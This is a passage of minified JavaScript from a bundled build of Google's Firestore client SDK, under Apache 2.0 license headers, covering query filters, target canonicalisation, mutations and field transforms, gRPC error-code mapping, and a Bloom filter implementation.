0}getFlattenedFilters(){return this.Te!==null||(this.Te=this.filters.reduce((e,n)=>e.concat(n.getFlattenedFilters()),[])),this.Te}getFilters(){return Object.assign([],this.filters)}}function cS(t){return t.op==="and"}function uS(t){return $P(t)&&cS(t)}function $P(t){for(const e of t.filters)if(e instanceof es)return!1;return!0}function B0(t){if(t instanceof gn)return t.field.canonicalString()+t.op.toString()+yc(t.value);if(uS(t))return t.filters.map(e=>B0(e)).join(",");{const e=t.filters.map(n=>B0(n)).join(",");return`${t.op}(${e})`}}function dS(t,e){return t instanceof gn?function(i,s){return s instanceof gn&&i.op===s.op&&i.field.isEqual(s.field)&&Jr(i.value,s.value)}(t,e):t instanceof es?function(i,s){return s instanceof es&&i.op===s.op&&i.filters.length===s.filters.length?i.filters.reduce((o,c,d)=>o&&dS(c,s.filters[d]),!0):!1}(t,e):void ze(19439)}function hS(t){return t instanceof gn?function(n){return`${n.field.canonicalString()} ${n.op} ${yc(n.value)}`}(t):t instanceof es?function(n){return n.op.toString()+" {"+n.getFilters().map(hS).join(" ,")+"}"}(t):"Filter"}class XP extends gn{constructor(e,n,i){super(e,n,i),this.key=Pe.fromName(i.referenceValue)}matches(e){const n=Pe.comparator(e.key,this.key);return this.matchesComparison(n)}}class ZP extends gn{constructor(e,n){super(e,"in",n),this.keys=fS("in",n)}matches(e){return this.keys.some(n=>n.isEqual(e.key))}}class JP extends gn{constructor(e,n){super(e,"not-in",n),this.keys=fS("not-in",n)}matches(e){return!this.keys.some(n=>n.isEqual(e.key))}}function fS(t,e){var n;return(((n=e.arrayValue)===null||n===void 0?void 0:n.values)||[]).map(i=>Pe.fromName(i.referenceValue))}class e8 extends gn{constructor(e,n){super(e,"array-contains",n)}matches(e){const n=e.data.field(this.field);return i_(n)&&xd(n.arrayValue,this.value)}}class t8 extends gn{constructor(e,n){super(e,"in",n)}matches(e){const n=e.data.field(this.field);return n!==null&&xd(this.value.arrayValue,n)}}class n8 extends gn{constructor(e,n){super(e,"not-in",n)}matches(e){if(xd(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;const n=e.data.field(this.field);return n!==null&&n.nullValue===void 0&&!xd(this.value.arrayValue,n)}}class i8 extends gn{constructor(e,n){super(e,"array-contains-any",n)}matches(e){const n=e.data.field(this.field);return!(!i_(n)||!n.arrayValue.values)&&n.arrayValue.values.some(i=>xd(this.value.arrayValue,i))}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class r8{constructor(e,n=null,i=[],s=[],o=null,c=null,d=null){this.path=e,this.collectionGroup=n,this.orderBy=i,this.filters=s,this.limit=o,this.startAt=c,this.endAt=d,this.Ie=null}}function pA(t,e=null,n=[],i=[],s=null,o=null,c=null){return new r8(t,e,n,i,s,o,c)}function r_(t){const e=Qe(t);if(e.Ie===null){let n=e.path.canonicalString();e.collectionGroup!==null&&(n+="|cg:"+e.collectionGroup),n+="|f:",n+=e.filters.map(i=>B0(i)).join(","),n+="|ob:",n+=e.orderBy.map(i=>function(o){return o.field.canonicalString()+o.dir}(i)).join(","),ap(e.limit)||(n+="|l:",n+=e.limit),e.startAt&&(n+="|lb:",n+=e.startAt.inclusive?"b:":"a:",n+=e.startAt.position.map(i=>yc(i)).join(",")),e.endAt&&(n+="|ub:",n+=e.endAt.inclusive?"a:":"b:",n+=e.endAt.position.map(i=>yc(i)).join(",")),e.Ie=n}return e.Ie}function s_(t,e){if(t.limit!==e.limit||t.orderBy.length!==e.orderBy.length)return!1;for(let n=0;n<t.orderBy.length;n++)if(!WP(t.orderBy[n],e.orderBy[n]))return!1;if(t.filters.length!==e.filters.length)return!1;for(let n=0;n<t.filters.length;n++)if(!dS(t.filters[n],e.filters[n]))return!1;return t.collectionGroup===e.collectionGroup&&!!t.path.isEqual(e.path)&&!!mA(t.startAt,e.startAt)&&mA(t.endAt,e.endAt)}function z0(t){return Pe.isDocumentKey(t.path)&&t.collectionGroup===null&&t.filters.length===0}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lp{constructor(e,n=null,i=[],s=[],o=null,c="F",d=null,f=null){this.path=e,this.collectionGroup=n,this.explicitOrderBy=i,this.filters=s,this.limit=o,this.limitType=c,this.startAt=d,this.endAt=f,this.Ee=null,this.de=null,this.Ae=null,this.startAt,this.endAt}}function s8(t,e,n,i,s,o,c,d){return new lp(t,e,n,i,s,o,c,d)}function cp(t){return new lp(t)}function gA(t){return t.filters.length===0&&t.limit===null&&t.startAt==null&&t.endAt==null&&(t.explicitOrderBy.length===0||t.explicitOrderBy.length===1&&t.explicitOrderBy[0].field.isKeyField())}function a8(t){return t.collectionGroup!==null}function ad(t){const e=Qe(t);if(e.Ee===null){e.Ee=[];const n=new Set;for(const o of e.explicitOrderBy)e.Ee.push(o),n.add(o.field.canonicalString());const i=e.explicitOrderBy.length>0?e.explicitOrderBy[e.explicitOrderBy.length-1].dir:"asc";(function(c){let d=new vn(Un.comparator);return c.filters.forEach(f=>{f.getFlattenedFilters().forEach(p=>{p.isInequality()&&(d=d.add(p.field))})}),d})(e).forEach(o=>{n.has(o.canonicalString())||o.isKeyField()||e.Ee.push(new vm(o,i))}),n.has(Un.keyField().canonicalString())||e.Ee.push(new vm(Un.keyField(),i))}return e.Ee}function Wr(t){const e=Qe(t);return e.de||(e.de=o8(e,ad(t))),e.de}function o8(t,e){if(t.limitType==="F")return pA(t.path,t.collectionGroup,e,t.filters,t.limit,t.startAt,t.endAt);{e=e.map(s=>{const o=s.dir==="desc"?"asc":"desc";return new vm(s.field,o)});const n=t.endAt?new ym(t.endAt.position,t.endAt.inclusive):null,i=t.startAt?new ym(t.startAt.position,t.startAt.inclusive):null;return pA(t.path,t.collectionGroup,e,t.filters,t.limit,n,i)}}function F0(t,e,n){return new lp(t.path,t.collectionGroup,t.explicitOrderBy.slice(),t.filters.slice(),e,n,t.startAt,t.endAt)}function up(t,e){return s_(Wr(t),Wr(e))&&t.limitType===e.limitType}function mS(t){return`${r_(Wr(t))}|lt:${t.limitType}`}function Wl(t){return`Query(target=${function(n){let i=n.path.canonicalString();return n.collectionGroup!==null&&(i+=" collectionGroup="+n.collectionGroup),n.filters.length>0&&(i+=`, filters: [${n.filters.map(s=>hS(s)).join(", ")}]`),ap(n.limit)||(i+=", limit: "+n.limit),n.orderBy.length>0&&(i+=`, orderBy: [${n.orderBy.map(s=>function(c){return`${c.field.canonicalString()} (${c.dir})`}(s)).join(", ")}]`),n.startAt&&(i+=", startAt: ",i+=n.startAt.inclusive?"b:":"a:",i+=n.startAt.position.map(s=>yc(s)).join(",")),n.endAt&&(i+=", endAt: ",i+=n.endAt.inclusive?"a:":"b:",i+=n.endAt.position.map(s=>yc(s)).join(",")),`Target(${i})`}(Wr(t))}; limitType=${t.limitType})`}function dp(t,e){return e.isFoundDocument()&&function(i,s){const o=s.key.path;return i.collectionGroup!==null?s.key.hasCollectionId(i.collectionGroup)&&i.path.isPrefixOf(o):Pe.isDocumentKey(i.path)?i.path.isEqual(o):i.path.isImmediateParentOf(o)}(t,e)&&function(i,s){for(const o of ad(i))if(!o.field.isKeyField()&&s.data.field(o.field)===null)return!1;return!0}(t,e)&&function(i,s){for(const o of i.filters)if(!o.matches(s))return!1;return!0}(t,e)&&function(i,s){return!(i.startAt&&!function(c,d,f){const p=fA(c,d,f);return c.inclusive?p<=0:p<0}(i.startAt,ad(i),s)||i.endAt&&!function(c,d,f){const p=fA(c,d,f);return c.inclusive?p>=0:p>0}(i.endAt,ad(i),s))}(t,e)}function l8(t){return t.collectionGroup||(t.path.length%2==1?t.path.lastSegment():t.path.get(t.path.length-2))}function pS(t){return(e,n)=>{let i=!1;for(const s of ad(t)){const o=c8(s,e,n);if(o!==0)return o;i=i||s.field.isKeyField()}return 0}}function c8(t,e,n){const i=t.field.isKeyField()?Pe.comparator(e.key,n.key):function(o,c,d){const f=c.data.field(o),p=d.data.field(o);return f!==null&&p!==null?gc(f,p):ze(42886)}(t.field,e,n);switch(t.dir){case"asc":return i;case"desc":return-1*i;default:return ze(19790,{direction:t.dir})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nl{constructor(e,n){this.mapKeyFn=e,this.equalsFn=n,this.inner={},this.innerSize=0}get(e){const n=this.mapKeyFn(e),i=this.inner[n];if(i!==void 0){for(const[s,o]of i)if(this.equalsFn(s,e))return o}}has(e){return this.get(e)!==void 0}set(e,n){const i=this.mapKeyFn(e),s=this.inner[i];if(s===void 0)return this.inner[i]=[[e,n]],void this.innerSize++;for(let o=0;o<s.length;o++)if(this.equalsFn(s[o][0],e))return void(s[o]=[e,n]);s.push([e,n]),this.innerSize++}delete(e){const n=this.mapKeyFn(e),i=this.inner[n];if(i===void 0)return!1;for(let s=0;s<i.length;s++)if(this.equalsFn(i[s][0],e))return i.length===1?delete this.inner[n]:i.splice(s,1),this.innerSize--,!0;return!1}forEach(e){Xa(this.inner,(n,i)=>{for(const[s,o]of i)e(s,o)})}isEmpty(){return JC(this.inner)}size(){return this.innerSize}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const u8=new un(Pe.comparator);function Us(){return u8}const gS=new un(Pe.comparator);function td(...t){let e=gS;for(const n of t)e=e.insert(n.key,n);return e}function yS(t){let e=gS;return t.forEach((n,i)=>e=e.insert(n,i.overlayedDocument)),e}function Po(){return od()}function vS(){return od()}function od(){return new nl(t=>t.toString(),(t,e)=>t.isEqual(e))}const d8=new un(Pe.comparator),h8=new vn(Pe.comparator);function ct(...t){let e=h8;for(const n of t)e=e.add(n);return e}const f8=new vn(Xe);function m8(){return f8}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function a_(t,e){if(t.useProto3Json){if(isNaN(e))return{doubleValue:"NaN"};if(e===1/0)return{doubleValue:"Infinity"};if(e===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:mm(e)?"-0":e}}function _S(t){return{integerValue:""+t}}function p8(t,e){return zP(e)?_S(e):a_(t,e)}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class hp{constructor(){this._=void 0}}function g8(t,e,n){return t instanceof Ad?function(s,o){const c={fields:{[nS]:{stringValue:tS},[rS]:{timestampValue:{seconds:s.seconds,nanos:s.nanoseconds}}}};return o&&n_(o)&&(o=op(o)),o&&(c.fields[iS]=o),{mapValue:c}}(n,e):t instanceof Ed?bS(t,e):t instanceof Td?xS(t,e):function(s,o){const c=wS(s,o),d=yA(c)+yA(s.Re);return U0(c)&&U0(s.Re)?_S(d):a_(s.serializer,d)}(t,e)}function y8(t,e,n){return t instanceof Ed?bS(t,e):t instanceof Td?xS(t,e):n}function wS(t,e){return t instanceof _m?function(i){return U0(i)||function(o){return!!o&&"doubleValue"in o}(i)}(e)?e:{integerValue:0}:null}class Ad extends hp{}class Ed extends hp{constructor(e){super(),this.elements=e}}function bS(t,e){const n=AS(e);for(const i of t.elements)n.some(s=>Jr(s,i))||n.push(i);return{arrayValue:{values:n}}}class Td extends hp{constructor(e){super(),this.elements=e}}function xS(t,e){let n=AS(e);for(const i of t.elements)n=n.filter(s=>!Jr(s,i));return{arrayValue:{values:n}}}class _m extends hp{constructor(e,n){super(),this.serializer=e,this.Re=n}}function yA(t){return en(t.integerValue||t.doubleValue)}function AS(t){return i_(t)&&t.arrayValue.values?t.arrayValue.values.slice():[]}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class v8{constructor(e,n){this.field=e,this.transform=n}}function _8(t,e){return t.field.isEqual(e.field)&&function(i,s){return i instanceof Ed&&s instanceof Ed||i instanceof Td&&s instanceof Td?pc(i.elements,s.elements,Jr):i instanceof _m&&s instanceof _m?Jr(i.Re,s.Re):i instanceof Ad&&s instanceof Ad}(t.transform,e.transform)}class w8{constructor(e,n){this.version=e,this.transformResults=n}}class ar{constructor(e,n){this.updateTime=e,this.exists=n}static none(){return new ar}static exists(e){return new ar(void 0,e)}static updateTime(e){return new ar(e)}get isNone(){return this.updateTime===void 0&&this.exists===void 0}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function Bf(t,e){return t.updateTime!==void 0?e.isFoundDocument()&&e.version.isEqual(t.updateTime):t.exists===void 0||t.exists===e.isFoundDocument()}class fp{}function ES(t,e){if(!t.hasLocalMutations||e&&e.fields.length===0)return null;if(e===null)return t.isNoDocument()?new o_(t.key,ar.none()):new Gd(t.key,t.data,ar.none());{const n=t.data,i=pi.empty();let s=new vn(Un.comparator);for(let o of e.fields)if(!s.has(o)){let c=n.field(o);c===null&&o.length>1&&(o=o.popLast(),c=n.field(o)),c===null?i.delete(o):i.set(o,c),s=s.add(o)}return new Za(t.key,i,new ji(s.toArray()),ar.none())}}function b8(t,e,n){t instanceof Gd?function(s,o,c){const d=s.value.clone(),f=_A(s.fieldTransforms,o,c.transformResults);d.setAll(f),o.convertToFoundDocument(c.version,d).setHasCommittedMutations()}(t,e,n):t instanceof Za?function(s,o,c){if(!Bf(s.precondition,o))return void o.convertToUnknownDocument(c.version);const d=_A(s.fieldTransforms,o,c.transformResults),f=o.data;f.setAll(TS(s)),f.setAll(d),o.convertToFoundDocument(c.version,f).setHasCommittedMutations()}(t,e,n):function(s,o,c){o.convertToNoDocument(c.version).setHasCommittedMutations()}(0,e,n)}function ld(t,e,n,i){return t instanceof Gd?function(o,c,d,f){if(!Bf(o.precondition,c))return d;const p=o.value.clone(),v=wA(o.fieldTransforms,f,c);return p.setAll(v),c.convertToFoundDocument(c.version,p).setHasLocalMutations(),null}(t,e,n,i):t instanceof Za?function(o,c,d,f){if(!Bf(o.precondition,c))return d;const p=wA(o.fieldTransforms,f,c),v=c.data;return v.setAll(TS(o)),v.setAll(p),c.convertToFoundDocument(c.version,v).setHasLocalMutations(),d===null?null:d.unionWith(o.fieldMask.fields).unionWith(o.fieldTransforms.map(b=>b.field))}(t,e,n,i):function(o,c,d){return Bf(o.precondition,c)?(c.convertToNoDocument(c.version).setHasLocalMutations(),null):d}(t,e,n)}function x8(t,e){let n=null;for(const i of t.fieldTransforms){const s=e.data.field(i.field),o=wS(i.transform,s||null);o!=null&&(n===null&&(n=pi.empty()),n.set(i.field,o))}return n||null}function vA(t,e){return t.type===e.type&&!!t.key.isEqual(e.key)&&!!t.precondition.isEqual(e.precondition)&&!!function(i,s){return i===void 0&&s===void 0||!(!i||!s)&&pc(i,s,(o,c)=>_8(o,c))}(t.fieldTransforms,e.fieldTransforms)&&(t.type===0?t.value.isEqual(e.value):t.type!==1||t.data.isEqual(e.data)&&t.fieldMask.isEqual(e.fieldMask))}class Gd extends fp{constructor(e,n,i,s=[]){super(),this.key=e,this.value=n,this.precondition=i,this.fieldTransforms=s,this.type=0}getFieldMask(){return null}}class Za extends fp{constructor(e,n,i,s,o=[]){super(),this.key=e,this.data=n,this.fieldMask=i,this.precondition=s,this.fieldTransforms=o,this.type=1}getFieldMask(){return this.fieldMask}}function TS(t){const e=new Map;return t.fieldMask.fields.forEach(n=>{if(!n.isEmpty()){const i=t.data.field(n);e.set(n,i)}}),e}function _A(t,e,n){const i=new Map;St(t.length===n.length,32656,{Ve:n.length,me:t.length});for(let s=0;s<n.length;s++){const o=t[s],c=o.transform,d=e.data.field(o.field);i.set(o.field,y8(c,d,n[s]))}return i}function wA(t,e,n){const i=new Map;for(const s of t){const o=s.transform,c=n.data.field(s.field);i.set(s.field,g8(o,c,e))}return i}class o_ extends fp{constructor(e,n){super(),this.key=e,this.precondition=n,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class A8 extends fp{constructor(e,n){super(),this.key=e,this.precondition=n,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class E8{constructor(e,n,i,s){this.batchId=e,this.localWriteTime=n,this.baseMutations=i,this.mutations=s}applyToRemoteDocument(e,n){const i=n.mutationResults;for(let s=0;s<this.mutations.length;s++){const o=this.mutations[s];o.key.isEqual(e.key)&&b8(o,e,i[s])}}applyToLocalView(e,n){for(const i of this.baseMutations)i.key.isEqual(e.key)&&(n=ld(i,e,n,this.localWriteTime));for(const i of this.mutations)i.key.isEqual(e.key)&&(n=ld(i,e,n,this.localWriteTime));return n}applyToLocalDocumentSet(e,n){const i=vS();return this.mutations.forEach(s=>{const o=e.get(s.key),c=o.overlayedDocument;let d=this.applyToLocalView(c,o.mutatedFields);d=n.has(s.key)?null:d;const f=ES(c,d);f!==null&&i.set(s.key,f),c.isValidDocument()||c.convertToNoDocument(Ye.min())}),i}keys(){return this.mutations.reduce((e,n)=>e.add(n.key),ct())}isEqual(e){return this.batchId===e.batchId&&pc(this.mutations,e.mutations,(n,i)=>vA(n,i))&&pc(this.baseMutations,e.baseMutations,(n,i)=>vA(n,i))}}class l_{constructor(e,n,i,s){this.batch=e,this.commitVersion=n,this.mutationResults=i,this.docVersions=s}static from(e,n,i){St(e.mutations.length===i.length,58842,{fe:e.mutations.length,ge:i.length});let s=function(){return d8}();const o=e.mutations;for(let c=0;c<o.length;c++)s=s.insert(o[c].key,i[c].version);return new l_(e,n,i,s)}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class T8{constructor(e,n){this.largestBatchId=e,this.mutation=n}getKey(){return this.mutation.key}isEqual(e){return e!==null&&this.mutation===e.mutation}toString(){return`Overlay{
      largestBatchId: ${this.largestBatchId},
      mutation: ${this.mutation.toString()}
    }`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class C8{constructor(e,n){this.count=e,this.unchangedNames=n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var cn,mt;function S8(t){switch(t){case fe.OK:return ze(64938);case fe.CANCELLED:case fe.UNKNOWN:case fe.DEADLINE_EXCEEDED:case fe.RESOURCE_EXHAUSTED:case fe.INTERNAL:case fe.UNAVAILABLE:case fe.UNAUTHENTICATED:return!1;case fe.INVALID_ARGUMENT:case fe.NOT_FOUND:case fe.ALREADY_EXISTS:case fe.PERMISSION_DENIED:case fe.FAILED_PRECONDITION:case fe.ABORTED:case fe.OUT_OF_RANGE:case fe.UNIMPLEMENTED:case fe.DATA_LOSS:return!0;default:return ze(15467,{code:t})}}function CS(t){if(t===void 0)return Vs("GRPC error has no .code"),fe.UNKNOWN;switch(t){case cn.OK:return fe.OK;case cn.CANCELLED:return fe.CANCELLED;case cn.UNKNOWN:return fe.UNKNOWN;case cn.DEADLINE_EXCEEDED:return fe.DEADLINE_EXCEEDED;case cn.RESOURCE_EXHAUSTED:return fe.RESOURCE_EXHAUSTED;case cn.INTERNAL:return fe.INTERNAL;case cn.UNAVAILABLE:return fe.UNAVAILABLE;case cn.UNAUTHENTICATED:return fe.UNAUTHENTICATED;case cn.INVALID_ARGUMENT:return fe.INVALID_ARGUMENT;case cn.NOT_FOUND:return fe.NOT_FOUND;case cn.ALREADY_EXISTS:return fe.ALREADY_EXISTS;case cn.PERMISSION_DENIED:return fe.PERMISSION_DENIED;case cn.FAILED_PRECONDITION:return fe.FAILED_PRECONDITION;case cn.ABORTED:return fe.ABORTED;case cn.OUT_OF_RANGE:return fe.OUT_OF_RANGE;case cn.UNIMPLEMENTED:return fe.UNIMPLEMENTED;case cn.DATA_LOSS:return fe.DATA_LOSS;default:return ze(39323,{code:t})}}(mt=cn||(cn={}))[mt.OK=0]="OK",mt[mt.CANCELLED=1]="CANCELLED",mt[mt.UNKNOWN=2]="UNKNOWN",mt[mt.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",mt[mt.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",mt[mt.NOT_FOUND=5]="NOT_FOUND",mt[mt.ALREADY_EXISTS=6]="ALREADY_EXISTS",mt[mt.PERMISSION_DENIED=7]="PERMISSION_DENIED",mt[mt.UNAUTHENTICATED=16]="UNAUTHENTICATED",mt[mt.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",mt[mt.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",mt[mt.ABORTED=10]="ABORTED",mt[mt.OUT_OF_RANGE=11]="OUT_OF_RANGE",mt[mt.UNIMPLEMENTED=12]="UNIMPLEMENTED",mt[mt.INTERNAL=13]="INTERNAL",mt[mt.UNAVAILABLE=14]="UNAVAILABLE",mt[mt.DATA_LOSS=15]="DATA_LOSS";/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const N8=new Pa([4294967295,4294967295],0);function bA(t){const e=$C().encode(t),n=new FC;return n.update(e),new Uint8Array(n.digest())}function xA(t){const e=new DataView(t.buffer),n=e.getUint32(0,!0),i=e.getUint32(4,!0),s=e.getUint32(8,!0),o=e.getUint32(12,!0);return[new Pa([n,i],0),new Pa([s,o],0)]}class c_{constructor(e,n,i){if(this.bitmap=e,this.padding=n,this.hashCount=i,n<0||n>=8)throw new nd(`Invalid padding: ${n}`);if(i<0)throw new nd(`Invalid hash count: ${i}`);if(e.length>0&&this.hashCount===0)throw new nd(`Invalid hash count: ${i}`);if(e.length===0&&n!==0)throw new nd(`Invalid padding when bitmap length is 0: ${n}`);this.pe=8*e.length-n,this.ye=Pa.fromNumber(this.pe)}we(e,n,i){let s=e.add(n.multiply(Pa.fromNumber(i)));return s.compare(N8)===1&&(s=new Pa([s.getBits(0),s.getBits(1)],0)),s.modulo(this.ye).toNumber()}Se(e){return!!(this.bitmap[Math.floor(e/8)]&1<<e%8)}mightContain(e){if(this.pe===0)return!1;const n=bA(e),[i,s]=xA(n);for(let o=0;o<this.hashCount;o++){const c=this.we(i,s,o);if(!this.Se(c))return!1}return!0}static create(e,n,i){const s=e%8==0?0:8-e%8,o=new Uint8Array(Math.ceil(e/8)),c=new c_(o,s,n);return i.forEach(d=>c.insert(d)),c}insert(e){if(this.pe===0)return;const n=bA(e),[i,s]=xA(n);for(let o=0;o<this.hashCount;o++){const c=this.we(i,s,o);this.be(c)}}be(e){const n=Math.floor(e/8),i=e%8;this.bitmap[n]|=1<<i}}class nd extends Error{constructor(){super(...arguments),this.name="BloomFilterError"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class mp{constructor(e,n,i,s,o){this.snapshotVersion=e,this.targetChanges=n,this.targetMismatches=i,this.documentUpdates=s,this.resolvedLimboDocuments=o}static createSynthesizedRemoteEventForCurrentChange(e,n,i){const s=new Map;return s.set(e,Yd.createSynthesizedTargetChangeForCurrentChange(e,n,i)),new mp(Ye.min(),s,new un(Xe),Us(),ct())}}class Yd{constructor(e,n,i,s,o){this.resumeToken=e,this.current=n,this.addedDocuments=i,this.modifiedDocuments=s,this.removedDocuments=o}static createSynthesizedTargetChangeForCurrentChange(e,n,i){return new Yd(i,n,ct(),ct(),ct())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zf{constructor(e,n,i,s){this.De=e,this.removedTargetIds=n,this.key=i,this.ve=s}}class SS{constructor(e,n){this.targetId=e,this.Ce=n}}class NS{constructor(e,n,i=Bn.EMPTY_BYTE_STRING,s=null){this.state=e,this.targetIds=n,this.resumeToken=i,this.cause=s}}class AA{constructor(){this.Fe=0,this.Me=EA(),this.xe=Bn.EMPTY_BYTE_STRING,this.Oe=!1,this.Ne=!0}get current(){return this.Oe}get resumeToken(){return this.xe}get Be(){return this.Fe!==0}get Le(){return this.Ne}ke(e){e.approximateByteSize()>0&&(this.Ne=!0,this.xe=e)}qe(){let e=ct(),n=ct(),i=ct();return this.Me.forEach((s,o)=>{switch(o){case 0:e=e.add(s);break;case 2:n=n.add(s);break;case 1:i=i.add(s);break;default:ze(38017,{changeType:o})}}),new Yd(this.xe,this.Oe,e,n,i)}Qe(){this.Ne=!1,this.Me=EA()}$e(e,n){this.Ne=!0,this.Me=this.Me.insert(e,n)}Ue(e){this.Ne=!0,this.Me=this.Me.remove(e)}Ke(){this.Fe+=1}We(){this.Fe-=1,St(this.Fe>=0,3241,{Fe:this.Fe})}Ge(){this.Ne=!0,this.Oe=!0}}class R8{constructor(e){this.ze=e,this.je=new Map,this.He=Us(),this.Je=Sf(),this.Ye=Sf(),this.Ze=new un(Xe)}Xe(e){for(const n of 